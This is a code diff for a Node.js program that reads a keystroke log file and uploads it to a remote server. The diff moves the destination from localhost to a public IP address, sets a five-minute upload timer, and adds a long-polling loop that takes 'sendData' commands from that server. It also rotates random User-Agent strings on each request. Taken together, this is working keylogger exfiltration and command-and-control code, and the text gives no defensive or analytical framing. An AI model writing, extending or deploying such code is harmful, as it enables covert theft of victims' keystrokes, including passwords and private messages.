@@ -2,11 +2,15 @@ const axios = require("axios");
 const fs = require("fs");
 const os = require("os");
 const PATH = `D://Clientkeylog.txt`;
-const URL = "http://localhost:24242";
+const URL = "http://91.149.140.29:24242";
+const LONG_POLL_TIMEOUT = 300000;
 
+//POST
 const sendData = async () => {
     try{
         const data = getData();
+        if (!data) return;
+
         await axios.post(`${URL}/data`, data, {
             headers: {
                 "User-Agent": getRandom(userAgents),
@@ -44,7 +48,27 @@ const getData = () => {
 }
 
 //5 min
-setInterval(() => sendData(), 300);
+setInterval(() => sendData(), 300000);
+
+//LONG POLLING
+const getCommand = async () => {
+    try{
+        const res = await axios.get(`${URL}/longpull`, {
+            timeout: LONG_POLL_TIMEOUT
+        });
+
+        if(res.data.action === "sendData"){
+            await sendData();
+        };
+
+        getCommand();
+
+    } catch{
+        setTimeout(getCommand, 1000);
+    }
+}
+
+getCommand();
 
 function getRandom(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
